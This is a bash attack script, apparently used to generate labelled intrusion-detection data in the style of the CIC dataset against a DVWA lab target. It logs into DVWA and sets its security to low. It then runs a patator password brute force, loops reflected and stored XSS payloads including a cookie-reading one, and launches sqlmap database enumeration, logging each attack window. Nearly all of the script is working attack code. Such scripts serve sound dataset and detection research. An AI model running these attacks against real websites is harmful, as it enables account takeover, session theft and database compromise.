#!/bin/bash
# ============================================================
#  attack.sh  --  Thursday-morning web attacks (CIC-faithful, patator)
#  RUN ON: Kali (attacker-73, 205.174.165.73)
#  TARGET: DVWA via victim PUBLIC IP (firewall NATs -> 192.168.10.50)
#
#  Order (CIC Thursday morning):
#    1) Web Brute Force  (patator, longest)
#    2) Web XSS          (medium)
#    3) Web SQL Injection(sqlmap, short burst)
#
#  Writes /tmp/attack_windows.log with exact start/stop stamps
#  used by label_flows.py.
#
#  USAGE:  ./attack.sh                 (target defaults to 205.174.165.68)
#          ./attack.sh 205.174.165.68  (explicit target)
# ============================================================

# -------- CONFIG --------
TARGET="${1:-205.174.165.68}"     # victim PUBLIC IP (-> 192.168.10.50)
DVWA="http://$TARGET/dvwa"
WORDLIST="/tmp/pw.txt"            # your lab wordlist (labpass...)
LOG="/tmp/attack_windows.log"
# ------------------------

for t in patator sqlmap curl python3; do
  command -v "$t" >/dev/null || echo "WARNING: $t not found"
done
[ -f "$WORDLIST" ] || { echo "ERROR: wordlist $WORDLIST not found"; exit 1; }

: > "$LOG"
stamp(){ date "+%Y-%m-%d %H:%M:%S"; }
mark(){ echo "$1 | $(stamp)" | tee -a "$LOG"; }

# ---- log in to DVWA to get a valid session cookie + set security=low ----
CJ=$(mktemp)
TOKEN=$(curl -s -c "$CJ" "$DVWA/login.php" | grep -oP "user_token' value='\K[0-9a-f]+")
curl -s -b "$CJ" -c "$CJ" -d "username=admin&password=password&user_token=$TOKEN&Login=Login" "$DVWA/login.php" >/dev/null
SEC_TOKEN=$(curl -s -b "$CJ" "$DVWA/security.php" | grep -oP "user_token' value='\K[0-9a-f]+")
curl -s -b "$CJ" -c "$CJ" -d "security=low&seclev_submit=Submit&user_token=$SEC_TOKEN" "$DVWA/security.php" >/dev/null
COOKIE=$(grep -oP 'PHPSESSID\s+\K\S+' "$CJ" | tail -1)
echo "session cookie PHPSESSID=$COOKIE"

echo "=========================================================="
echo " Thursday web attacks -> $TARGET   (source appears as 205.174.165.73)"
echo " brute force wordlist: $WORDLIST"
echo " log: $LOG"
echo "=========================================================="

# ================= 1) WEB BRUTE FORCE (patator) 0:05 -> 0:25 =================
sleep 300
mark "BRUTE_FORCE_START"
BF_END=$(( $(date +%s) + 1200 ))
while [ "$(date +%s)" -lt "$BF_END" ]; do
  patator http_fuzz \
    url="$DVWA/vulnerabilities/brute/?username=admin&password=FILE0&Login=Login" \
    method=GET 0="$WORDLIST" \
    header="Cookie: PHPSESSID=$COOKIE; security=low" \
    follow=0 accept_cookie=0 \
    -x ignore:fgrep='Username and/or password incorrect' \
    2>/dev/null
  sleep 3
done
mark "BRUTE_FORCE_STOP"

# ================= gap 0:25 -> 0:30 =================
sleep 300

# ================= 2) XSS 0:30 -> 0:40 =================
mark "XSS_START"
XSS_PAYLOADS=(
  "<script>alert(1)</script>"
  "<img src=x onerror=alert(2)>"
  "<svg/onload=alert(3)>"
  "\"><script>document.cookie</script>"
  "<body onload=alert(4)>"
)
XSS_END=$(( $(date +%s) + 600 ))
while [ "$(date +%s)" -lt "$XSS_END" ]; do
  for p in "${XSS_PAYLOADS[@]}"; do
    enc=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$p")
    curl -s -o /dev/null -b "PHPSESSID=$COOKIE; security=low" "$DVWA/vulnerabilities/xss_r/?name=$enc"
    curl -s -o /dev/null -b "PHPSESSID=$COOKIE; security=low" -d "txtName=user&mtxMessage=$enc&btnSign=Sign" "$DVWA/vulnerabilities/xss_s/"
    sleep 1
  done
done
mark "XSS_STOP"

# ================= gap 0:40 -> 0:45 =================
sleep 300

# ================= 3) SQL INJECTION (sqlmap) 0:45 -> 0:47 =================
mark "SQLI_START"
sqlmap -u "$DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=$COOKIE; security=low" \
  --batch --dbs --threads 4 --level 2 --risk 1 >/dev/null 2>&1 &
SQL_PID=$!
sleep 120
kill "$SQL_PID" 2>/dev/null
mark "SQLI_STOP"

echo "=========================================================="
echo " ALL ATTACKS DONE.  Windows recorded in: $LOG"
cat "$LOG"
echo "=========================================================="
rm -f "$CJ"
